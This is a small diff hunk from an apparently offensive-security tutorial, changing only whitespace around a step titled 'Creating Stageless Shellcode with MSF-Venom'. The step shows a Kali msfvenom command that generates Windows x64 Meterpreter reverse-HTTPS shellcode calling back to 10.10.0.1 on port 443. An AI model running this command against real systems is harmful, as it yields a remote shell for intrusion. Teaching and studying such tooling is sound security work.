@@ -19,6 +19,7 @@ on a webserver.
 
 
 **1. Creating Stageless Shellcode with MSF-Venom**
+
 **kali>** msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.0.1 LPORT=443 -f c --arch x64 --platform windows -o /tmp/meterx64.c
 
 ![image](https://user-images.githubusercontent.com/50073731/160273773-3835a406-3500-43fd-b895-5f34e04188be.png)
